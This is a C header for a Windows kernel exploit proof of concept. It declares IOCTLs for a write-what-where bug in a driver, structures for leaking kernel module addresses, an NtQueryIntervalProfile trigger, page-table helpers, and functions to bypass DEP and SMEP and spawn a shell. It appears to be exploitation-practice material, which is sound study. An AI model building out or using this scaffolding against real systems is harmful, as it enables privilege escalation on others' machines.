#pragma once

#include "targetver.h"

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <Winternl.h>
#include <intrin.h>
#include <Sddl.h>

#pragma comment(lib, "ntdll.lib")

#define IOCTL_PWN_WHAT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PWN2_WHERE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PWN3_TRIGGER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct {
	PVOID   Unknown1;
	PVOID   Unknown2;
	PVOID   Base;
	ULONG   Size;
	ULONG   Flags;
	USHORT  Index;
	USHORT  NameLength;
	USHORT  LoadCount;
	USHORT  PathLength;
	CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
	ULONG   Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(__stdcall *NtQueryIntervalProfile_t)(UINT, PULONG);

void write_what_where(UINT64 what, UINT64 where);
PVOID getHalAndMisc();
void callPayload();
void spawnShell();
UINT64 getPTfromVA(UINT64 vaddr);
UINT64 getPDfromVA(UINT64 vaddr);
UINT64 getPDPTfromVA(UINT64 vaddr);
UINT64 getPML4fromVA(UINT64 vaddr);
void POC1_DEP_SMEP_BYPASS();
